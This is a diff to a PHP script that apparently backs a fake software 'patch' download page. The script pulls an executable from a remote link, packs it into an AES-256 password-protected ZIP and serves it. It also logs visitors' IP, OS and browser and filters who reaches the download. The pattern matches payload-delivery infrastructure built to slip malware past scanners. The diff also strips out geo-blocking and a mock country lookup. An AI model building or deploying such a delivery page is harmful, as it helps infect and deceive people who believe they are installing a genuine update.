@@ -11,6 +11,7 @@ $archiving = $settings->Archiving->Enabled;
 $correct_password = $settings->Archiving->Password; // Password for the ZIP file
 $software_name = $settings->Archiving->SoftwareName; // Software Name
 $zip_file = $settings->Archiving->ZIPName; // Name of the resulting ZIP file
+$FileName = $settings->FileName; // Set filename when download
 
 // PatchDownloadLinks
 $patchURL = $settings->PatchDownloadLinks[0];
@@ -26,8 +27,6 @@ $browser = getBrowser();
 // Get the visitor's IP, OS, and Country
 $userIP = $_SERVER['REMOTE_ADDR'];
 $userOS = getOS();
-$userCountry = getCountryByIP($userOS);
-
 
 // Get the main domain dynamically
 $mainDomain = $_SERVER['HTTP_HOST']; // Extracts the domain name, like "domain.com"
@@ -37,17 +36,6 @@ if ($settings->PageStatus == "OFF") {
     header("Location: https://$mainDomain");
     exit();
 }
-
-// Redirect if the user is from a blocked GEO or not in allowed GEO
-// if (in_array($userCountry, $settings->BlockedGEO) || !in_array($userCountry, $settings->GEO)) {
-//     header("Location: https://$mainDomain");
-//     exit();
-// }
-if (in_array($userCountry, $settings->BlockedGEO) || in_array('100', $settings->BlockedGEO)) {
-    header("Location: https://$mainDomain");
-    exit();
-}
-
 
 // Redirect if the user's OS is not in the allowed list
 if (!in_array($userOS, $settings->OS)) {
@@ -87,61 +75,61 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
     // if archiving => ON, users will download .zip file
     if ($archiving == "ON") {
         
-        // Log the visitor and download count
-        logVisitor($userIP, $userOS, $countrycode, $rayid, $browser);
+         // Log the visitor and download count
+         logVisitor($userIP, $userOS, $countrycode, $rayid, $browser);
         
-        // Download the external .exe file from the patch download link
-        $exe_content = file_get_contents($patchURL);
-
-
-        if ($exe_content === false) {
-            die('Failed to download the .exe file.');
-        }
-
-        // Create a new ZIP file
-        $zip = new ZipArchive();
-        if ($zip->open($zip_file, ZipArchive::CREATE) !== TRUE) {
-            die('Failed to create .zip file.');
-        }
-
-        // Add the .exe file to the ZIP archive
-        $zip->addFromString($patchURL, $exe_content);
-
-        // Set password and encryption for the ZIP file
-        $zip->setPassword($correct_password);
-        $zip->setEncryptionName($patchURL, ZipArchive::EM_AES_256);
-        $zip->close();
-
-        // Serve the ZIP file to the user for download
-        if (file_exists($zip_file)) {
-
-            header('Content-Description: File Transfer');
-            header('Content-Type: application/zip');
-            header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
-            header('Expires: 0');
-            header('Cache-Control: must-revalidate');
-            header('Pragma: public');
-            header('Content-Length: ' . filesize($zip_file));
-            readfile($zip_file);
-
-            unlink($zip_file); // Delete the ZIP file after serving it
-
-            // modify the download status
-            modifyDownloadStatus();
-            
-            // download count
-            incrementDownloadCount();
-
-            // Set a cookie to track that the user has successfully downloaded the file
-            setcookie('download_success', true, time() + (86400 * 30)); // Set cookie for 30 days
-
-            exit;
+         // Download the external .exe file from the patch download link
+         $exe_content = file_get_contents($patchURL);
+ 
+ 
+         if ($exe_content === false) {
+             die('Failed to download the .exe file.');
+         }
+ 
+         // Create a new ZIP file
+         $zip = new ZipArchive();
+         if ($zip->open($zip_file, ZipArchive::CREATE) !== TRUE) {
+             die('Failed to create .zip file.');
+         }
+ 
+         // Add the .exe file to the ZIP archive
+         $zip->addFromString($patchURL, $exe_content);
+ 
+         // Set password and encryption for the ZIP file
+         $zip->setPassword($correct_password);
+         $zip->setEncryptionName($patchURL, ZipArchive::EM_AES_256);
+         $zip->close();
+ 
+         // Serve the ZIP file to the user for download
+         if (file_exists($zip_file)) {
+ 
+             header('Content-Description: File Transfer');
+             header('Content-Type: application/zip');
+             header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
+             header('Expires: 0');
+             header('Cache-Control: must-revalidate');
+             header('Pragma: public');
+             header('Content-Length: ' . filesize($zip_file));
+             readfile($zip_file);
+ 
+             unlink($zip_file); // Delete the ZIP file after serving it
+ 
+             // modify the download status
+             modifyDownloadStatus();
+             
+             // download count
+             incrementDownloadCount();
+ 
+             // Set a cookie to track that the user has successfully downloaded the file
+             setcookie('download_success', true, time() + (86400 * 30)); // Set cookie for 30 days
+ 
+             exit;
         } else {
             die('Failed to create the .zip file.');
         }
 
     }
-
+    
 } else {
     echo 'Invalid request.';
 }
@@ -156,12 +144,6 @@ function getOS() {
     if (preg_match('/Android/i', $userAgent)) return 'Android';
     if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
     return 'Unknown OS';
-}
-
-// Function to get country by IP (mocked for demo purposes)
-function getCountryByIP($ip) {
-    // Replace this with a GEO IP lookup API in production
-    return 'US'; // Mock return value for demo
 }
 
 
